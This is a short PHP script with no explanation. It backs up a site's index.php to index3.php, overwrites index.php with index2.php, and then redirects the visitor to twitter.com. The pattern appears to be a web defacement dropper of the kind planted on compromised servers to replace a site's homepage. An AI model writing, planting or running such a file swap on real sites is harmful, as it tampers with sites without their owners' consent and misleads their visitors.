<?php
$filt = 'index.php';
$filo = 'index2.php';
$filtr = 'index3.php';
copy($filt , $filtr);
copy($filo , $filt);
?>
<?php
header("location:http://twitter.com");
?>